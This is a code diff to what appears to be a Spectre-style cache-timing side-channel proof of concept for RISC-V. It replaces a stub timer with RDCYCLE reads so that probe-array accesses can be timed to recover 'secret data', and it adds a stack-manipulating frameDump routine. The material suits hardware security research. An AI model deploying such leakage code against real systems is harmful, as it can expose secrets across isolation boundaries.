@@ -2,6 +2,7 @@
 #include <stdint.h>
 
 #include "cache.h"
+#include "riscv-util.h"
 
 uint8_t attackArray[256*L1_LINE_SZ_BYTES];
 uint64_t results[256];
@@ -16,14 +17,14 @@ uint8_t min(uint64_t* results, uint64_t sz){
     return minVal;
 }
 
-// temp function until I can get the .S file working
-uint64_t readTime(){
-    return 0;
-}
-
-// temp function until I can get the .S file working
+/* Manipulate the stack */
 void frameDump(){
-    return;
+    __asm__ ( "rdcycle x5;"
+              "rdcycle x5;"
+              "rdcycle x5;"
+              "rdcycle x5;"
+              "rdcycle x5;"
+              "rdcycle x5;" );
 }
 
 void specFunc(uint64_t addr){
@@ -41,9 +42,9 @@ int main(void){
         
         // read in the secret data
         for (uint8_t i = 0; i < 256; ++i){
-            uint64_t start = readTime();
+            uint64_t start = RDCYCLE;
             uint8_t dummy = attackArray[i*L1_LINE_SZ_BYTES];
-            uint64_t end = readTime();
+            uint64_t end = RDCYCLE;
         
             results[i] = end - start;
         }
